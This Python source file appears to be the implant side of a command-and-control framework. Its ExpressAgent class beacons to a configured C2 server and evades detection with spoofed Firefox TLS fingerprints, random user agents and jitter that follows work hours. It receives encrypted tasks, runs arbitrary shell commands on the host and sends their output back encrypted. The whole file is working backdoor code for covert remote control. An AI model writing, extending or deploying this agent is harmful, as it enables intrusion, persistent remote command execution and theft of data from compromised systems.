import time
import json
import random
import tls_client
from uuid import uuid4, UUID
from datetime import datetime
from fake_useragent import UserAgent
from express.config import load_configuration
from express.envelope import EncryptedEnvelope
from express.security import FernetCipher
from express.system import invoke


class ExpressAgent:
    def __init__(self):
        self.agent_id = uuid4()
        self.user_agent = UserAgent().random
        self.config = load_configuration("config.toml")
        self.tls_session = tls_client.Session(client_identifier="firefox_120", random_tls_extension_order=True)

        # extract common data from config
        beacon_cfg = self.config["beacon"]
        c2server_cfg = self.config["c2server"]
        self.sleep_min = beacon_cfg["sleep_min"]
        self.sleep_max = beacon_cfg["sleep_max"]
        self.workdays = beacon_cfg["workdays"]
        self.workhours = beacon_cfg["workhours"]
        self.base_url = c2server_cfg["base_url"]
        self.beacon_path = c2server_cfg["beacon_path"]
        self.report_path = c2server_cfg["report_path"]

        # initialize crypto
        envelope_cfg = self.config["envelope"]
        passphrase = envelope_cfg["passphrase"]
        salt = bytes.fromhex(envelope_cfg["salt"])
        payload_field = envelope_cfg["payload_field"]
        cipher = FernetCipher(passphrase, salt)
        self.envelope = EncryptedEnvelope(cipher, payload_field)

    def start(self):
        """ Centralized function to start agent """
        while True:
            self.dynamic_jitter()
            self.beacon()

    def dynamic_jitter(self):
        """ Random sleep jitter """
        # determine burst or quiet mode for beacon
        current = datetime.now()
        if current.hour in self.workhours and current.isoweekday() in self.workdays:
            sleep_sec = random.randint(self.sleep_min, self.sleep_max)
            print("[INFO] Current in work hour, beaconing in burst mode !!")
        else:
            sleep_sec = random.randint(self.sleep_min * 2, self.sleep_max * 3)
            print("[INFO] Current not in work hour, beaconing in quiet mode !!")

        print(f"[INFO] Sleeping for {sleep_sec} seconds......")
        time.sleep(sleep_sec)

    def beacon(self):
        """ Core function for beaconing """
        headers = {"User-Agent": self.user_agent, "X-Session-ID": str(self.agent_id)}
        beacon_url: str = self.base_url + self.beacon_path

        try:
            response = self.tls_session.post(beacon_url, headers=headers)
            if response.status_code == 200:
                payload = self.envelope.unwrap(response.json())
                task_id = payload.get("task_id")
                action_type = payload.get("action_type")
                params = payload.get("params")
                if action_type and task_id:
                    self.dispatch_task(UUID(task_id), action_type, params)

        except Exception as ex:
            print(f"[ERR] Beacon error: {ex}")

    def report(self, task_id: UUID, data: str):
        """ Core function for sending data back to C2 server """
        headers = {"User-Agent": self.user_agent, "X-Session-ID": str(self.agent_id)}
        report_url = self.base_url + self.report_path
        payload = {
            "task_id": str(task_id),
            "output": data
        }

        try:
            encrypted_payload = self.envelope.wrap(payload)
            self.tls_session.post(report_url, json=encrypted_payload, headers=headers)

        except Exception as ex:
            print(f"[ERR] Report error: {ex}")

    def dispatch_task(self, task_id: UUID, action_type: str, params: dict | None):
        """ Dispath task and return result to report endpoint """
        print(f"[INFO] Executing task: {task_id}")
        if action_type == "shell":
            if not params or not params.get("command"): return
            output = invoke(params["command"])
            self.report(task_id, output)


if __name__ == "__main__":
    agent = ExpressAgent()
    agent.start()
